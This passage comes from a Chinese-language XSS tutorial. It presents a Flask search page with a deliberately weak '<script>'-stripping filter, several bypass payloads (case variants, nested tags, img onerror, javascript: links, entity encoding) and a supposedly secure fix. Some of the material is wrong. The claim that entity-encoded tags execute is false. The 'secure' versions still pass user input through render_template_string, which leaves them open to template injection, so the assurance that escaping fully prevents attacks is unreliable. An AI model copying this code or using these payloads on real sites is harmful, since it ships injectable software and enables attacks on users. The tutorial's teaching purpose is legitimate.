            <input type="submit" value="留言">
        </form>
        <hr>
    '''
    for c in comments:
        safe_c = html.escape(c)  # 输出转义
        html_content += f'<div>{safe_c}</div>\n'
    html_content += '</body></html>'

    response = make_response(render_template_string(html_content))
    # 也可通过HTTP头设置CSP
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    return response

if __name__ == '__main__':
    app.run(debug=True, port=5004)
讲解：
输出转义：html.escape(c)将HTML特殊字符转义，防止脚本注入。
CSP：通过Content-Security-Policy头限制脚本只能从同源加载，禁止内联脚本执行。
双重防御，即使转义失效（如富文本场景），CSP也能提供保护。
测试
提交恶意留言：<script>alert(1)</script>
页面显示为普通文本，不会弹窗。
若尝试内联脚本，CSP会阻止执行。

练习2-5：XSS过滤器绕过挑战
题目描述
面对一个简单的XSS过滤器（仅过滤<script>标签），尝试绕过。
漏洞代码（xss_filter_bypass.py）

"""
简单的XSS过滤器（仅替换<script>标签）
运行：python xss_filter_bypass.py
"""
from flask import Flask, request, render_template_string

app = Flask(__name__)

def filter_xss(input_str):
    # 简单过滤：删除<script>和</script>（不区分大小写？这里只处理小写）
    filtered = input_str.replace('<script>', '').replace('</script>', '')
    return filtered

@app.route('/search')
def search():
    q = request.args.get('q', '')
    safe_q = filter_xss(q)  # 应用过滤器
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>搜索</title></head>
    <body>
        <h1>您搜索的内容：{safe_q}</h1>
    </body>
    </html>
    '''
    return render_template_string(html)

if __name__ == '__main__':
    app.run(debug=True, port=5005)
解：
过滤器仅删除<script>和</script>字符串，不处理其他标签或大小写变种。
绕过Payload（可成功）
大小写绕过：

<Script>alert(1)</Script>
过滤器只匹配小写，因此不会被删除。
嵌套标签绕过

<scr<script>ipt>alert(1)</scr</script>ipt>
过滤后变成<script>alert(1)</script>，仍可执行。
使用其他标签和事件：

<img src=x onerror=alert(1)>
完全绕过过滤器。
使用伪协议：

<a href="javascript:alert(1)">click</a>
使用编码：

&#60;script&#62;alert(1)&#60;/script&#62;
浏览器解析HTML实体后执行。
防御改进（完整转义）

"""
安全的过滤器：使用html.escape
"""
from flask import Flask, request, render_template_string
import html

app = Flask(__name__)

@app.route('/search')
def search():
    q = request.args.get('q', '')
    safe_q = html.escape(q)  # 全面转义
    html_content = f'''
    <!DOCTYPE html>
    <html>
    <head><title>搜索</title></head>
    <body>
        <h1>您搜索的内容：{safe_q}</h1>
    </body>
    </html>
    '''
    return render_template_string(html_content)
讲解：
使用html.escape()将所有HTML特殊字符转义，彻底防止XSS。
不应依赖黑名单过滤，应使用白名单或转义。
